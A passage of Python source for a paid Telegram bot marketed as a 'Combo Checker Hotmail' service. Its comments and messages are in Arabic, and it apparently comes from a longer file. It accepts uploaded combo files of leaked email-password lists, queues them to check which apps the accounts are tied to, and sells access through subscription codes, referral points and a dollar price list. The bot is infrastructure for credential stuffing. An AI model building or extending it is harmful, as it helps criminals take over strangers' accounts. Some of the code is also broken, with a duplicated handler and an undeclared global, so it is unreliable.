        INSERT OR REPLACE INTO subscriptions (user_id, expiry_date)
        VALUES (?, ?)
        ''', (user_id, expiry_date.isoformat()))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error adding subscription: {e}")
        conn.rollback()

# Function to remove subscription
def remove_subscription(user_id):
    try:
        cursor.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error removing subscription: {e}")
        conn.rollback()

# Function to check subscription
def check_subscription(user_id):
    try:
        cursor.execute('SELECT expiry_date FROM subscriptions WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        if result:
            expiry_date = datetime.fromisoformat(result[0])
            if datetime.now() < expiry_date:
                return True
        return False
    except sqlite3.Error as e:
        print(f"Error checking subscription: {e}")
        return False

# Function to create a new code
def create_code(hours):
    try:
        code = str(uuid.uuid4()).replace("-", "")[:12].upper()
        expiry_date = datetime.now() + timedelta(days=30)  # الكود صالح لمدة 30 يومًا
        cursor.execute('''
        INSERT INTO codes (code, hours, expiry_date)
        VALUES (?, ?, ?)
        ''', (code, hours, expiry_date.isoformat()))
        conn.commit()
        return code
    except sqlite3.Error as e:
        print(f"Error creating code: {e}")
        conn.rollback()
        return None

# Function to redeem a code
def redeems_code(user_id, code):
    try:
        cursor.execute('SELECT hours, expiry_date, used FROM codes WHERE code = ?', (code,))
        result = cursor.fetchone()
        if result:
            hours, expiry_date, used = result
            if datetime.now() < datetime.fromisoformat(expiry_date) and not used:
                add_subscription(user_id, hours)
                cursor.execute('UPDATE codes SET used = 1 WHERE code = ?', (code,))
                conn.commit()
                return True
        return False
    except sqlite3.Error as e:
        print(f"Error redeeming code: {e}")
        conn.rollback()
        return False

# Function to get subscription hours
def get_subscription_hours(user_id):
    try:
        cursor.execute('SELECT expiry_date FROM subscriptions WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        if result:
            expiry_date = datetime.fromisoformat(result[0])
            remaining_time = expiry_date - datetime.now()
            return int(remaining_time.total_seconds() // 3600)
        return 0
    except sqlite3.Error as e:
        print(f"Error getting subscription hours: {e}")
        return 0

# Function to add points to a user
def add_points(user_id, points):
    try:
        cursor.execute('''
        INSERT OR REPLACE INTO points (user_id, points)
        VALUES (?, COALESCE((SELECT points FROM points WHERE user_id = ?), 0) + ?)
        ''', (user_id, user_id, points))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error adding points: {e}")
        conn.rollback()

# Function to get user points
def get_points(user_id):
    try:
        cursor.execute('SELECT points FROM points WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        return max(result[0], 0) if result else 0
    except sqlite3.Error as e:
        print(f"Error getting points: {e}")
        return 0

# Function to redeem points for subscription time
def redeem_points(user_id):
    points = get_points(user_id)
    if points >= 50:  # 50 نقطة = ساعة إضافية من الاشتراك
        add_subscription(user_id, 1)
        add_points(user_id, -50)
        return True
    return False

# Command handler for /create_code
@bot.message_handler(commands=['create_code'])
def create_code_command(message):
    if message.from_user.id == 7172101608:  # استبدل بمعرف المالك
        try:
            parts = message.text.split()
            if len(parts) != 2:
                bot.reply_to(message, "الرجاء إدخال الأمر بشكل صحيح: /create_code <عدد الساعات>")
                return
            
            hours = int(parts[1])
            code = create_code(hours)
            if code:
                expiry_date = datetime.now() + timedelta(days=30)
                bot.reply_to(message, f"""
𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀

𝗣𝗟𝗔𝗡 ➜ 𝗩𝗜𝗣

𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}

𝗞𝗘𝗬 ➜ {code}

𝗨𝗦𝗘 /redeems [𝗞𝗘𝗬]
""")
            else:
                bot.reply_to(message, "حدث خطأ أثناء إنشاء الكود.")
        except ValueError:
            bot.reply_to(message, "الرجاء إدخال عدد ساعات صحيح.")
        except Exception as e:
            bot.reply_to(message, f"خطأ: {e}")
    else:
        bot.reply_to(message, "ليس لديك صلاحية لتنفيذ هذا الأمر.")

# Command handler for /redeem
@bot.message_handler(commands=['redeems'])
def redeems_code_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if len(message.text.split()) == 2:
        code = message.text.split()[1]
        if redeems_code(user_id, code):
            bot.reply_to(message, f"تم تفعيل الاشتراك بنجاح! لديك الآن اشتراك لمدة {get_subscription_hours(user_id)} ساعة.")
        else:
            bot.reply_to(message, "الكود غير صالح أو منتهي الصلاحية.")
    else:
        bot.reply_to(message, "استخدم الأمر كالتالي: /redeem [الكود]")        
                        
# Command handler for /start
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    # التحقق من وجود رابط إحالة
    if len(message.text.split()) > 1 and message.text.split()[1].startswith('ref_'):
        referrer_id = int(message.text.split()[1].split('_')[1])  # استخراج معرف المستخدم الذي قام بالإحالة
        
        # التحقق من أن المستخدم لا يحيل نفسه
        if referrer_id != user_id:
            # التحقق من أن الإحالة لم تتم من قبل
            cursor.execute('SELECT * FROM referrals WHERE referrer_id = ? AND referred_id = ?', (referrer_id, user_id))
            if not cursor.fetchone():
                # تسجيل الإحالة في قاعدة البيانات
                cursor.execute('INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)', (referrer_id, user_id))
                conn.commit()
                
                # منح النقاط للمستخدم الذي قام بالإحالة والمستخدم الذي تمت إحالته
                add_points(referrer_id, 10)  # 50 نقطة للمستخدم الذي قام بالإحالة
                add_points(user_id, 0)      # 25 نقطة للمستخدم الذي تمت إحالته
                
                bot.send_message(chat_id, f"تمت الإحالة بنجاح! لقد خصل صديقك علي 10 نقاط.")
            else:
                bot.send_message(chat_id, "لقد قمت بالإحالة من قبل.")
        else:
            bot.send_message(chat_id, "لا يمكنك إحالة نفسك.")

    # باقي الكود الخاص ببدء البوت
    if not check_subscription(chat_id):
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="ϟ Programmer - zeyad", url="https://t.me/j6j66666")
        keyboard.add(contact_button)
        
        random_number = random.randint(4, 17)
        photo_url = f'https://t.me/animephotossea/{random_number}'
        
        bot.send_photo(
            chat_id=message.chat.id,
            photo=photo_url,
            caption=f'''<b>Welcome Dear {message.from_user.first_name} - You're Not Subscribed in BOT ❌</b>
• For Show Bot All orders  Send /help
• Programmer ~ @j6j66666''',
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        return
    
    init_user_data(chat_id)
    user_data = get_user_data(chat_id)
    user_data["combo_queue"].clear()
    user_data["current_files"].clear()
    user_data["a"], user_data["b"] = 0, 0
    
    if user_data["status_message_id"]:
        try:
            bot.delete_message(chat_id, user_data["status_message_id"])
        except:
            pass
        user_data["status_message_id"] = None

    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="ϟ Our Channel ϟ", url="https://t.me/toolspython1")
    keyboard.add(contact_button)
    
    username = message.from_user.first_name
    random_number = random.randint(4, 17)
    photo_url = f'https://t.me/animephotossea/{random_number}'
    points = get_points(user_id)
    
    bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=f'''<strong>ϟ Welcome -> {username} ϟ
- Your Subscription is Active ✅
- Your Points: {points} ✨

- For Choose tied applications hotmail  Send -> /select_services ✅

ϟ - Programmer • @j6j66666 ϟ</strong>''',
        reply_markup=keyboard,
        parse_mode='HTML'
    )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# Command handler for /redeem
@bot.message_handler(commands=['redeems'])
def redeems_code_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if len(message.text.split()) == 2:
        code = message.text.split()[1]
        if redeems_code(user_id, code):
            bot.reply_to(message, f"تم تفعيل الاشتراك بنجاح! لديك الآن اشتراك لمدة {get_subscription_hours(user_id)} ساعة.")
        else:
            bot.reply_to(message, "الكود غير صالح أو منتهي الصلاحية.")
    else:
        bot.reply_to(message, "استخدم الأمر كالتالي: /redeem [الكود]")
    
@bot.message_handler(commands=['my_ref_link'])
def my_ref_link(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # إنشاء رابط الإحالة
    ref_link = f"https://t.me/checkerzeyadbot?start=ref_{user_id}"
    
    # إرسال الرابط إلى المستخدم
    bot.send_message(chat_id, f"رابط الإحالة الخاص بك:\n{ref_link}\n\nشارك هذا الرابط مع أصدقائك لتحصل على 10 نقاط لكل إحالة ناجحة!")
    
@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, '''الأوامر المتاحة:
/start - بدء استخدام البوت
/prices - عرض الأسعار
/points - عرض النقاط
/redeem - استرداد النقاط مقابل وقت إضافي
/my_ref_link لانشاء رابط دعوه خاص بك
/help - عرض الأوامر المتاحة
/commands للمالك فقط
''')

def get_db_connection():
    if conn is None or conn.closed:
        conn = sqlite3.connect('subscriptions.db', check_same_thread=False)
        cursor = conn.cursor()
    return conn, cursor

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if not check_subscription(chat_id):
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="Programmer - zeyad", url="https://t.me/j6j66666")
        keyboard.add(contact_button)
        
        random_number = random.randint(4, 17)
        photo_url = f'https://t.me/animephotossea/{random_number}'
        bot.send_photo(
            chat_id=message.chat.id,
            photo=photo_url,
            caption=f'''<b>Welcome Dear {message.from_user.first_name} - You're Not Subscribed in BOT ❌</b>
            • For Show Bot Prices Send /prices
            • Programmer ~ @j6j66666''',
            reply_markup=keyboard,
            parse_mode="HTML")
        return
    init_user_data(chat_id)
    user_data = get_user_data(chat_id)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name
        file_path = os.path.join(os.getcwd(), file_name)

        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        with open(file_path, 'r') as f:
            lines = f.readlines()
            account_count = len(lines)

        if file_path not in user_data["current_files"]:
            user_data["combo_queue"].append(file_path)
            user_data["current_files"].add(file_path)
            bot.reply_to(message, f"تم استلام الملف '{file_name}' بنجاح.\nعدد الحسابات في الملف: {account_count} حساب.")
        else:
            bot.reply_to(message, f"الملف '{file_name}' قيد المعالجة بالفعل.")

        if len(user_data["combo_queue"]) == 1:
            start_processing(chat_id)
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ أثناء معالجة الملف: {e}")

# Command handler for /select_services
@bot.message_handler(commands=['select_services'])
def select_services(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if not check_subscription(chat_id):
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="ϟ Programmer - zeyad", url="https://t.me/j6j66666")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>• Welcome Dear » {message.from_user.first_name}
- Youre Not Subscribed in BOT ❌

• For Show Bot Priced Send /prices
- Programmer ~ @j6j66666 </b>''',reply_markup=keyboard, parse_mode="HTML")
        return
    init_user_data(chat_id)
    user_data = get_user_data(chat_id)
    points = get_points(user_id)
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = []

    for service in services.keys():
        if service in user_data["selected_services"]:
            buttons.append(types.InlineKeyboardButton(f"✅ {service}", callback_data=f"service_{service}"))
        else:
            buttons.append(types.InlineKeyboardButton(f"❌ {service}", callback_data=f"service_{service}"))

    for i in range(0, len(buttons), 3):
        markup.row(*buttons[i:i+3])

    # إضافة زر "تحديد الكل" وزر "تم"
    markup.row(types.InlineKeyboardButton("تحديد الكل ✅", callback_data="select_all"))
    markup.row(types.InlineKeyboardButton("تم ✅", callback_data="done"))

    bot.send_message(chat_id, f"اختر التطبيقات التي تريد فحصها. لديك {points} نقطة.", reply_markup=markup)
    
# Callback query handler for service selection
@bot.callback_query_handler(func=lambda call: call.data.startswith('service_'))
def handle_service_selection(call):
    chat_id = call.message.chat.id
    init_user_data(chat_id)
    user_data = get_user_data(chat_id)
    service = call.data.split('_')[1]
    if service in user_data["selected_services"]:
        user_data["selected_services"].remove(service)
    else:
        user_data["selected_services"].add(service)
    
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = []

    for service_name in services.keys():
        if service_name in user_data["selected_services"]:
            buttons.append(types.InlineKeyboardButton(f"✅ {service_name}", callback_data=f"service_{service_name}"))
        else:
            buttons.append(types.InlineKeyboardButton(f"❌ {service_name}", callback_data=f"service_{service_name}"))

    for i in range(0, len(buttons), 3):
        markup.row(*buttons[i:i+3])

    # إعادة إضافة زر "تحديد الكل" وزر "تم"
    markup.row(types.InlineKeyboardButton("تحديد الكل ✅", callback_data="select_all"))
    markup.row(types.InlineKeyboardButton("تم ✅", callback_data="done"))

    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="اختر التطبيقات التي تريد فحصها:", reply_markup=markup)
    bot.answer_callback_query(call.id, f"تم اختيار {service}")

# Callback query handler for select all
@bot.callback_query_handler(func=lambda call: call.data == "select_all")
def handle_select_all(call):
    chat_id = call.message.chat.id
    init_user_data(chat_id)
    user_data = get_user_data(chat_id)
    
    # تحديد جميع التطبيقات
    user_data["selected_services"] = set(services.keys())
    
    # تحديث الرسالة مع تحديد الكل
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = []

    for service in services.keys():
        buttons.append(types.InlineKeyboardButton(f"✅ {service}", callback_data=f"service_{service}"))

    for i in range(0, len(buttons), 3):
        markup.row(*buttons[i:i+3])

    # إعادة إضافة زر "تحديد الكل" وزر "تم"
    markup.row(types.InlineKeyboardButton("تحديد الكل ✅", callback_data="select_all"))
    markup.row(types.InlineKeyboardButton("تم ✅", callback_data="done"))

    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="تم تحديد جميع التطبيقات:", reply_markup=markup)
    bot.answer_callback_query(call.id, "تم تحديد جميع التطبيقات")
    
# Callback query handler for done
@bot.callback_query_handler(func=lambda call: call.data == "done")
def handle_done(call):
    chat_id = call.message.chat.id
    init_user_data(chat_id)
    user_data = get_user_data(chat_id)
    bot.answer_callback_query(call.id, "تم تأكيد الاختيار")
    bot.send_message(chat_id, f"تم اختيار التطبيقات التالية: {', '.join(user_data['selected_services'])}")

# Command handler for /prices
@bot.message_handler(func=lambda message: message.text.lower().startswith('.prices') or message.text.lower().startswith('/prices'))
def respondn_to_vhk(message):
 bot.reply_to(message,'''•🚀 *بوت فحص كومبو هوتميل - Combo Checker Hotmail Bot*
✨ اشترك الآن واستمتع بأفضل الأسعار! ✨  
---
💎 أسعار الاشتراكات: 
✅ اشتراك يوم واحد - Day: 3$ 💵  
✅ اشتراك أسبوع واحد - Week: 7$ 💰  
✅ اشتراك نصف شهر - Half Month: 10$ 💳  
✅ اشتراك شهر كامل - Month: 17$ 🏅  
---
⏳ *اشتراك بالساعات:
⏱ الساعة الواحدة مقابل 5 نجوم فقط! ✨  
---
💳 *طرق الدفع المتاحة:*
✅ نقبل جميع طرق الدفع الدولية (💳🌍💵💶💷💴)  
🌎 متاح للعملاء حول العالم!  
---
📞 *للاستفسار أو الشراء:*  
🖱 تواصل معنا عبر: [@j6j66666]
---
🎁 **لماذا ننصح باختيارنا؟**  
✔️ أسعار منافسة  
✔️ دعم فني سريع ومتاح 24/7  
✔️ سهولة في الاستخدام  
✔️ دفع آمن ومضمون  
---''')

# Main function
if __name__ == '__main__':
    try:
        if bot:
            print("روح للبوت وارسل /start ")
            bot.infinity_polling()
        else:
            print("....")
    except Exception as e:
        print(f"حدث خطأ: {e}")
    finally:
        # لا تقم بإغلاق الاتصال هنا
        pass